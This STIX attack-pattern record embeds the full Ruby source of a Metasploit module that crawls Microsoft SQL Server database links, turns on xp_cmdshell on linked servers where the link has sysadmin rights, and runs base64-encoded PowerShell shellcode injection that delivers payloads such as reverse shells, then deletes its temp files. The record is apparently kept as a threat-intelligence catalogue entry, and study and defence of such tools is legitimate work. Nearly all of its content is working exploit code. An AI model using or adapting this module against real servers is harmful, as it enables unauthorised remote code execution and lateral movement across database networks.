{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d8b28520-954e-4b18-b49a-67badefc1290",
    "created": "2024-08-14T16:39:51.773172Z",
    "modified": "2024-08-14T16:39:51.773176Z",
    "name": "Microsoft SQL Server Database Link Crawling Command Execution",
    "description": " This module can be used to crawl MS SQL Server database links and deploy Metasploit payloads through links configured with sysadmin privileges using a valid SQL Server Login.  If you are attempting to obtain multiple reverse shells using this module we recommend setting the \"DisablePayloadHandler\" advanced option to \"true\", and setting up a exploit/multi/handler to run in the background as a job to support multiple incoming shells.  If you are interested in deploying payloads to specific servers this module also supports that functionality via the \"DEPLOYLIST\" option.  Currently, the module is capable of delivering payloads to both 32bit and 64bit Windows systems via powershell memory injection methods based on Matthew Graeber's work. As a result, the target server must have powershell installed. By default all of the crawl information is saved to a CSV formatted log file and MSF loot so that the tool can also be used for auditing without deploying payloads. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mssql/mssql_linkcrawler.rb",
            "external_id": "mssql_linkcrawler.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.slideshare.net/nullbind/sql-server-exploitation-escalation-pilfering-appsec-usa-2012"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SQL Server Database Link Crawling Command Execution',\n      'Description'    => %q{\n          This module can be used to crawl MS SQL Server database links and deploy\n        Metasploit payloads through links configured with sysadmin privileges using a\n        valid SQL Server Login.\n\n          If you are attempting to obtain multiple reverse shells using this module we\n        recommend setting the \"DisablePayloadHandler\" advanced option to \"true\", and setting\n        up a exploit/multi/handler to run in the background as a job to support multiple incoming\n        shells.\n\n          If you are interested in deploying payloads to specific servers this module also\n        supports that functionality via the \"DEPLOYLIST\" option.\n\n          Currently, the module is capable of delivering payloads to both 32bit and 64bit\n        Windows systems via powershell memory injection methods based on Matthew Graeber's\n        work. As a result, the target server must have powershell installed. By default,\n        all of the crawl information is saved to a CSV formatted log file and MSF loot so\n        that the tool can also be used for auditing without deploying payloads.\n      },\n      'Author'         =>\n        [\n          'Antti Rantasaari <antti.rantasaari[at]netspi.com>',\n          'Scott Sutherland \"nullbind\" <scott.sutherland[at]netspi.com>'\n        ],\n      'Platform'      => [ 'win' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://www.slideshare.net/nullbind/sql-server-exploitation-escalation-pilfering-appsec-usa-2012'],\n          ['URL','http://msdn.microsoft.com/en-us/library/ms188279.aspx'],\n          ['URL','http://www.exploit-monday.com/2011_10_16_archive.html']\n        ],\n      'DisclosureDate' => '2000-01-01',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'CmdStagerFlavor' => 'vbs',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptBool.new('DEPLOY',       [false, 'Deploy payload via the sysadmin links', false]),\n        OptString.new('DEPLOYLIST', [false,'Comma separated list of systems to deploy to']),\n        OptString.new('PASSWORD',   [true, 'The password for the specified username'])\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new('POWERSHELL_PATH', [true, 'Path to powershell.exe', \"C:\\\\windows\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"])\n      ])\n  end\n\n  def exploit\n    # Display start time\n    time1 = Time.new\n    print_status(\"-------------------------------------------------\")\n    print_status(\"Start time : #{time1.inspect}\")\n    print_status(\"-------------------------------------------------\")\n\n    # Check if credentials are correct\n    print_status(\"Attempting to connect to SQL Server at #{rhost}:#{rport}...\")\n\n    if !mssql_login_datastore\n      print_error(\"Invalid SQL Server credentials\")\n      print_status(\"-------------------------------------------------\")\n      return\n    end\n\n    # Define master array to keep track of enumerated database information\n    masterList = Array.new\n    masterList[0] = Hash.new            # Define new hash\n    masterList[0][\"name\"] = \"\"          # Name of the current database server\n    masterList[0][\"db_link\"] = \"\"       # Name of the linked database server\n    masterList[0][\"db_user\"] = \"\"       # User configured on the database server link\n    masterList[0][\"db_sysadmin\"] = \"\"   # Specifies if  the database user configured for the link has sysadmin privileges\n    masterList[0][\"db_version\"] = \"\"    # Database version of the linked database server\n    masterList[0][\"db_os\"] = \"\"         # OS of the linked database server\n    masterList[0][\"path\"] = [[]]        # Link path used during crawl - all possible link paths stored\n    masterList[0][\"done\"] = 0           # Used to determine if linked need to be crawled\n\n    shelled = Array.new                 # keeping track of shelled systems - multiple incoming sa links could result in multiple shells on one system\n\n    # Setup query for gathering information from database servers\n    versionQuery = \"select @@servername,system_user,is_srvrolemember('sysadmin'),(REPLACE(REPLACE(REPLACE\\\n    (ltrim((select REPLACE((Left(@@Version,CHARINDEX('-',@@version)-1)),'Microsoft','')+ rtrim(CONVERT\\\n    (char(30), SERVERPROPERTY('Edition'))) +' '+ RTRIM(CONVERT(char(20), SERVERPROPERTY('ProductLevel')))+\\\n    CHAR(10))), CHAR(10), ''), CHAR(13), ''), CHAR(9), '')) as version, RIGHT(@@version, LEN(@@version)- 3 \\\n    -charindex (' ON ',@@VERSION)) as osver,is_srvrolemember('sysadmin'),(select count(srvname) from \\\n    master..sysservers where dataaccess=1 and srvname!=@@servername and srvproduct = 'SQL Server')as linkcount\"\n\n    # Create loot table to store configuration information from crawled database server links\n    linked_server_table = Rex::Text::Table.new(\n      'Header'  => 'Linked Server Table',\n      'Indent'   => 1,\n      'Columns' => ['db_server', 'db_version', 'db_os', 'link_server', 'link_user', 'link_privilege', 'link_version', 'link_os','link_state']\n    )\n    save_loot = \"\"\n\n    # Start crawling through linked database servers\n    while masterList.any? {|f| f[\"done\"] == 0}\n      # Find the first DB server that has not been crawled (not marked as done)\n      server = masterList.detect {|f| f[\"done\"] == 0}\n\n      # Get configuration information from the database server\n      sql = query_builder(server[\"path\"].first,\"\",0,versionQuery)\n      result = mssql_query(sql, false) if mssql_login_datastore\n      parse_results = result[:rows]\n      parse_results.each { |s|\n        server[\"name\"] = s[0]\n        server[\"db_user\"] = s[1]\n        server[\"db_sysadmin\"] = s[5]\n        server[\"db_version\"] =  s[3]\n        server[\"db_os\"] = s[4]\n        server[\"numlinks\"] = s[6]\n      }\n      if masterList.length == 1\n        print_good(\"Successfully connected to #{server[\"name\"]}\")\n        if datastore['VERBOSE']\n          show_configs(server[\"name\"],parse_results,true)\n        elsif server[\"db_sysadmin\"] == 1\n          print_good(\"Sysadmin on #{server[\"name\"]}\")\n        end\n      end\n      if server[\"db_sysadmin\"] == 1\n        enable_xp_cmdshell(server[\"path\"].first,server[\"name\"],shelled)\n      end\n\n      # If links were found, determine if they can be connected to and add to crawl list\n      if (server[\"numlinks\"] > 0)\n        # Enable loot\n        save_loot = \"yes\"\n\n        # Select a list of the linked database servers that exist on the current database server\n        print_status(\"\")\n        print_status(\"-------------------------------------------------\")\n        print_status(\"Crawling links on #{server[\"name\"]}...\")\n        # Display number db server links\n        print_status(\"Links found: #{server[\"numlinks\"]}\")\n        print_status(\"-------------------------------------------------\")\n        execute = \"select srvname from master..sysservers where dataaccess=1 and srvname!=@@servername and srvproduct = 'SQL Server'\"\n        sql = query_builder(server[\"path\"].first,\"\",0,execute)\n        result = mssql_query(sql, false) if mssql_login_datastore\n\n        result[:rows].each {|name|\n          name.each {|name|\n\n            # Check if link works and if sysadmin permissions - temp array to save orig server[path]\n            temppath = Array.new\n            temppath = server[\"path\"].first.dup\n            temppath << name\n\n            # Get configuration information from the linked server\n            sql = query_builder(temppath,\"\",0,versionQuery)\n            result = mssql_query(sql, false) if mssql_login_datastore\n\n            # Add newly aquired db servers to the masterlist, but don't add them if the link is broken or already exists\n            if result[:errors].empty? and result[:rows] != nil then\n              # Assign db query results to variables for hash\n              parse_results = result[:rows]\n\n              # Add link server information to loot\n              link_status = 'up'\n              write_to_report(name,server,parse_results,linked_server_table,link_status)\n\n              # Display link server information in verbose mode\n              if datastore['VERBOSE']\n                show_configs(name,parse_results)\n                print_status(\"  o Link path: #{masterList.first[\"name\"]} -> #{temppath.join(\" -> \")}\")\n              else\n                if parse_results[0][5] == 1\n                  print_good(\"Link path: #{masterList.first[\"name\"]} -> #{temppath.join(\" -> \")} (Sysadmin!)\")\n                else\n                  print_status(\"Link path: #{masterList.first[\"name\"]} -> #{temppath.join(\" -> \")}\")\n                end\n              end\n\n              # Add link to masterlist hash\n              unless masterList.any? {|f| f[\"name\"] == name}\n                masterList << add_host(name,server[\"path\"].first,parse_results)\n              else\n                (0..masterList.length-1).each do |x|\n                  if masterList[x][\"name\"] == name\n                    masterList[x][\"path\"] << server[\"path\"].first.dup\n                    masterList[x][\"path\"].last << name\n                    unless shelled.include?(name)\n                      if parse_results[0][2]==1\n                        enable_xp_cmdshell(masterList[x][\"path\"].last.dup,name,shelled)\n                      end\n                    end\n                  else\n                    break\n                  end\n                end\n              end\n            else\n              # Add to report\n              linked_server_table << [server[\"name\"],server[\"db_version\"],server[\"db_os\"],name,'NA','NA','NA','NA','Connection Failed']\n\n              # Display status to user\n              if datastore['VERBOSE']\n                print_status(\" \")\n                print_error(\"Linked Server: #{name} \")\n                print_error(\"  o Link Path: #{masterList.first[\"name\"]} -> #{temppath.join(\" -> \")} - Connection Failed\")\n                print_status(\"    Failure could be due to:\")\n                print_status(\"    - A dead server\")\n                print_status(\"    - Bad credentials\")\n                print_status(\"    - Nested open queries through SQL 2000\")\n              else\n                print_error(\"Link Path: #{masterList.first[\"name\"]} -> #{temppath.join(\" -> \")} - Connection Failed\")\n              end\n            end\n          }\n        }\n      end\n      # Set server to \"crawled\"\n      server[\"done\"]=1\n    end\n\n    print_status(\"-------------------------------------------------\")\n\n    # Setup table for loot\n    this_service = nil\n    if framework.db and framework.db.active\n      this_service = report_service(\n        :host  => rhost,\n        :port => rport,\n        :name => 'mssql',\n        :proto => 'tcp'\n      )\n    end\n\n    # Display end time\n    time1 = Time.new\n    print_status(\"End time : #{time1.inspect}\")\n    print_status(\"-------------------------------------------------\")\n\n    # Write log to loot / file\n    if (save_loot==\"yes\")\n      filename= \"#{datastore['RHOST']}-#{datastore['RPORT']}_linked_servers.csv\"\n      path = store_loot(\"crawled_links\", \"text/plain\", datastore['RHOST'], linked_server_table.to_csv, filename, \"Linked servers\",this_service)\n      print_good(\"Results have been saved to: #{path}\")\n    end\n  end\n\n  # ---------------------------------------------------------------------\n  # Method that builds nested openquery statements using during crawling\n  # ---------------------------------------------------------------------\n  def query_builder(path,sql,ticks,execute)\n\n    # Temp used to maintain the original masterList[x][\"path\"]\n    temp = Array.new\n    path.each {|i| temp << i}\n\n    # Actual query - defined when the function originally called - ticks multiplied\n    if path.length == 0\n      return execute.gsub(\"'\",\"'\"*2**ticks)\n\n    # openquery generator\n    else\n      sql = \"select * from openquery(\\\"\" + temp.shift + \"\\\",\" + \"'\"*2**ticks + query_builder(temp,sql,ticks+1,execute) + \"'\"*2**ticks + \")\"\n      return sql\n    end\n  end\n\n  # ---------------------------------------------------------------------\n  # Method that builds nested openquery statements using during crawling\n  # ---------------------------------------------------------------------\n  def query_builder_rpc(path,sql,ticks,execute)\n\n    # Temp used to maintain the original masterList[x][\"path\"]\n    temp = Array.new\n    path.each {|i| temp << i}\n\n    # Actual query - defined when the function originally called - ticks multiplied\n    if path.length == 0\n      return execute.gsub(\"'\",\"'\"*2**ticks)\n\n    # Openquery generator\n    else\n      exec_at = temp.shift\n      quotes = \"'\"*2**ticks\n      sql = \"exec(#{quotes}#{query_builder_rpc(temp, sql,ticks + 1, execute)}#{quotes}) at [#{exec_at}]\"\n      return sql\n    end\n  end\n\n  # ---------------------------------------------------------------------\n  # Method for adding new linked database servers to the crawl list\n  # ---------------------------------------------------------------------\n  def add_host(name,path,parse_results)\n\n    # Used to add new servers to masterList\n    server = Hash.new\n    server[\"name\"] = name\n    temppath = Array.new\n    path.each {|i| temppath << i }\n    server[\"path\"] = [temppath]\n    server[\"path\"].first << name\n    server[\"done\"] = 0\n    parse_results.each {|stuff|\n      server[\"db_user\"] = stuff.at(1)\n      server[\"db_sysadmin\"] = stuff.at(2)\n      server[\"db_version\"] =  stuff.at(3)\n      server[\"db_os\"] = stuff.at(4)\n      server[\"numlinks\"] = stuff.at(6)\n    }\n    return server\n  end\n\n  # ---------------------------------------------------------------------\n  # Method to display configuration information\n  # ---------------------------------------------------------------------\n  def show_configs(i,parse_results,entry=false)\n\n    print_status(\" \")\n    parse_results.each {|stuff|\n\n      # Translate syadmin code\n      status = stuff.at(5)\n      if status == 1 then\n        dbpriv = \"sysadmin\"\n      else\n        dbpriv = \"user\"\n      end\n\n      # Display database link information\n      if entry == false\n        print_status(\"Linked Server: #{i}\")\n        print_status(\"  o Link user: #{stuff.at(1)}\")\n        print_status(\"  o Link privs: #{dbpriv}\")\n        print_status(\"  o Link version: #{stuff.at(3)}\")\n        print_status(\"  o Link OS: #{stuff.at(4).strip}\")\n        print_status(\"  o Links on server: #{stuff.at(6)}\")\n      else\n        print_status(\"Server: #{i}\")\n        print_status(\"  o Server user: #{stuff.at(1)}\")\n        print_status(\"  o Server privs: #{dbpriv}\")\n        print_status(\"  o Server version: #{stuff.at(3)}\")\n        print_status(\"  o Server OS: #{stuff.at(4).strip}\")\n        print_status(\"  o Server on server: #{stuff.at(6)}\")\n      end\n    }\n  end\n\n  # ---------------------------------------------------------------------\n  # Method for generating the report and loot\n  # ---------------------------------------------------------------------\n  def write_to_report(i,server,parse_results,linked_server_table,link_status)\n    parse_results.each {|stuff|\n      # Parse server information\n      db_link_user = stuff.at(1)\n      db_link_sysadmin = stuff.at(2)\n      db_link_version =  stuff.at(3)\n      db_link_os = stuff.at(4)\n\n      # Add link server to the reporting array and set link_status to 'up'\n      linked_server_table << [server[\"name\"],server[\"db_version\"],server[\"db_os\"],i,db_link_user,db_link_sysadmin,db_link_version,db_link_os,link_status]\n\n      return linked_server_table\n    }\n  end\n\n  # ---------------------------------------------------------------------\n  # Method for enabling xp_cmdshell\n  # ---------------------------------------------------------------------\n  def enable_xp_cmdshell(path,name,shelled)\n    # Enables \"show advanced options\" and xp_cmdshell if needed and possible\n    # They cannot be enabled in user transactions (i.e. via openquery)\n    # Only enabled if RPC_Out is enabled for linked server\n    # All changes are reverted after payload delivery and execution\n\n    # Check if \"show advanced options\" is enabled\n    execute = \"select cast(value_in_use as int) FROM  sys.configurations WHERE  name = 'show advanced options'\"\n    sql = query_builder(path,\"\",0,execute)\n    result = mssql_query(sql, false) if mssql_login_datastore\n    saoOrig = result[:rows].pop.pop\n\n    # Check if \"xp_cmdshell\" is enabled\n    execute = \"select cast(value_in_use as int) FROM  sys.configurations WHERE  name = 'xp_cmdshell'\"\n    sql = query_builder(path,\"\",0,execute)\n    result = mssql_query(sql, false) if mssql_login_datastore\n    xpcmdOrig = result[:rows].pop.pop\n\n    # Try blindly to enable \"xp_cmdshell\" on the linked server\n    # Note:\n    # This only works if rpcout is enabled for all links in the link path.\n    # If that is not the case it fails cleanly.\n    if xpcmdOrig == 0\n      if saoOrig == 0\n        # Enabling show advanced options and xp_cmdshell\n        execute = \"sp_configure 'show advanced options',1;reconfigure\"\n        sql = query_builder_rpc(path,\"\",0,execute)\n        result = mssql_query(sql, false) if mssql_login_datastore\n      end\n\n      # Enabling xp_cmdshell\n      print_status(\"\\t - xp_cmdshell is not enabled on \" + name + \"... Trying to enable\")\n      execute = \"sp_configure 'xp_cmdshell',1;reconfigure\"\n      sql = query_builder_rpc(path,\"\",0,execute)\n      result = mssql_query(sql, false) if mssql_login_datastore\n    end\n\n    # Verifying that xp_cmdshell is now enabled (could be unsuccessful due to server policies, total removal etc.)\n    execute = \"select cast(value_in_use as int) FROM  sys.configurations WHERE  name = 'xp_cmdshell'\"\n    sql = query_builder(path,\"\",0,execute)\n    result = mssql_query(sql, false) if mssql_login_datastore\n    xpcmdNow = result[:rows].pop.pop\n\n    if xpcmdNow == 1 or xpcmdOrig == 1\n      print_status(\"\\t - Enabled xp_cmdshell on \" + name) if xpcmdOrig == 0\n      if datastore['DEPLOY']\n        print_status(\"Ready to deploy a payload #{name}\")\n        if datastore['DEPLOYLIST']==\"\"\n          datastore['DEPLOYLIST'] = nil\n        end\n        if !datastore['DEPLOYLIST'].nil? && datastore[\"VERBOSE\"]\n          print_status(\"\\t - Checking if #{name} is on the deploy list...\")\n        end\n        if datastore['DEPLOYLIST'] != nil\n          deploylist = datastore['DEPLOYLIST'].upcase.split(',')\n        end\n        if datastore['DEPLOYLIST'] == nil or deploylist.include? name.upcase\n          if !datastore['DEPLOYLIST'].nil? && datastore[\"VERBOSE\"]\n            print_status(\"\\t - #{name} is on the deploy list.\")\n          end\n          unless shelled.include?(name)\n            powershell_upload_exec(path)\n            shelled << name\n          else\n            print_status(\"Payload already deployed on #{name}\")\n          end\n        elsif !datastore['DEPLOYLIST'].nil? && datastore[\"VERBOSE\"]\n          print_status(\"\\t - #{name} is not on the deploy list\")\n        end\n      end\n    else\n      print_error(\"\\t - Unable to enable xp_cmdshell on \" + name)\n    end\n\n    # Revert soa and xp_cmdshell to original state\n    if xpcmdOrig == 0 and xpcmdNow == 1\n      print_status(\"\\t - Disabling xp_cmdshell on \" + name)\n      execute = \"sp_configure 'xp_cmdshell',0;reconfigure\"\n      sql = query_builder_rpc(path,\"\",0,execute)\n      result = mssql_query(sql, false) if mssql_login_datastore\n    end\n    if saoOrig == 0 and xpcmdNow == 1\n      execute = \"sp_configure 'show advanced options',0;reconfigure\"\n      sql = query_builder_rpc(path,\"\",0,execute)\n      result = mssql_query(sql, false) if mssql_login_datastore\n    end\n  end\n\n  # ----------------------------------------------------------------------\n  # Method that delivers shellcode payload via powershell thread injection\n  # ----------------------------------------------------------------------\n  def powershell_upload_exec(path)\n\n    # Create powershell script that will inject shell code from the selected payload\n    myscript =\"$code = @\\\"\n[DllImport(\\\"kernel32.dll\\\")]\npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n[DllImport(\\\"kernel32.dll\\\")]\npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n[DllImport(\\\"msvcrt.dll\\\")]\npublic static extern IntPtr memset(IntPtr dest, uint src, uint count);\n\\\"@\n$winFunc = Add-Type -memberDefinition $code -Name \\\"Win32\\\" -namespace Win32Functions -passthru\n[Byte[]]$sc =#{Rex::Text.to_hex(payload.encoded).gsub('\\\\',',0').sub(',','')}\n$size = 0x1000\nif ($sc.Length -gt 0x1000) {$size = $sc.Length}\n$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)\nfor ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}\n$winFunc::CreateThread(0,0,$x,0,0,0)\"\n\n    # Unicode encode powershell script\n    mytext_uni = Rex::Text.to_unicode(myscript)\n\n    # Base64 encode unicode\n    mytext_64 = Rex::Text.encode_base64(mytext_uni)\n\n    # Generate random file names\n    rand_filename = rand_text_alpha(8)\n    var_duplicates = rand_text_alpha(8)\n\n    # Write base64 encoded powershell payload to temp file\n    # This is written 2500 characters at a time due to xp_cmdshell ruby function limitations\n    # Also, line number tracking was added so that duplication lines caused by nested linked\n    # queries could be found and removed.\n    print_status(\"Deploying payload...\")\n    linenum = 0\n    mytext_64.scan(/.{1,2500}/).each {|part|\n      execute = \"select 1; EXEC master..xp_cmdshell 'powershell -C \\\"Write \\\"--#{linenum}--#{part}\\\" >> %TEMP%\\\\#{rand_filename}\\\"'\"\n      sql = query_builder(path,\"\",0,execute)\n      result = mssql_query(sql, false) if mssql_login_datastore\n      linenum = linenum+1\n    }\n\n    # Remove duplicate lines from temp file and write to new file\n    execute = \"select 1;exec master..xp_cmdshell 'powershell -C \\\"gc %TEMP%\\\\#{rand_filename}| get-unique > %TEMP%\\\\#{var_duplicates}\\\"'\"\n    sql = query_builder(path,\"\",0,execute)\n    result = mssql_query(sql, false) if mssql_login_datastore\n\n    # Remove tracking tags from lines\n    execute = \"select 1;exec master..xp_cmdshell 'powershell -C \\\"gc %TEMP%\\\\#{var_duplicates} | Foreach-Object {$_ -replace \\\\\\\"--.*--\\\\\\\",\\\\\\\"\\\\\\\"} | Set-Content %TEMP%\\\\#{rand_filename}\\\"'\"\n    sql = query_builder(path,\"\",0,execute)\n    result = mssql_query(sql, false) if mssql_login_datastore\n\n    # Used base64 encoded powershell command so that we could use -noexit and avoid parsing errors\n    # If running on 64bit system, 32bit powershell called from syswow64\n    powershell_cmd =  \"$temppath=(gci env:temp).value;$dacode=(gc $temppath\\\\#{rand_filename}) -join '';if((gci env:processor_identifier).value -like\\\n    '*64*'){$psbits=\\\"#{datastore['POWERSHELL_PATH']} -noexit -noprofile -encodedCommand $dacode\\\"} else {$psbits=\\\"powershell.exe\\\n    -noexit -noprofile -encodedCommand $dacode\\\"};iex $psbits\"\n    powershell_uni = Rex::Text.to_unicode(powershell_cmd)\n    powershell_64 = Rex::Text.encode_base64(powershell_uni)\n\n    # Setup query\n    execute = \"select 1; EXEC master..xp_cmdshell 'powershell -EncodedCommand #{powershell_64}'\"\n    sql = query_builder(path,\"\",0,execute)\n\n    # Execute the playload\n    print_status(\"Executing payload...\")\n    result = mssql_query(sql, false) if mssql_login_datastore\n    # Remove payload data from the target server\n    execute = \"select 1; EXEC master..xp_cmdshell 'powershell -C \\\"Remove-Item %TEMP%\\\\#{rand_filename}\\\";powershell -C \\\"Remove-Item %TEMP%\\\\#{var_duplicates}\\\"'\"\n    sql = query_builder(path,\"\",0,execute)\n    result = mssql_query(sql,false)\n  end\nend\n",
    "x_mitre_disclosure_date": "2000-01-01",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}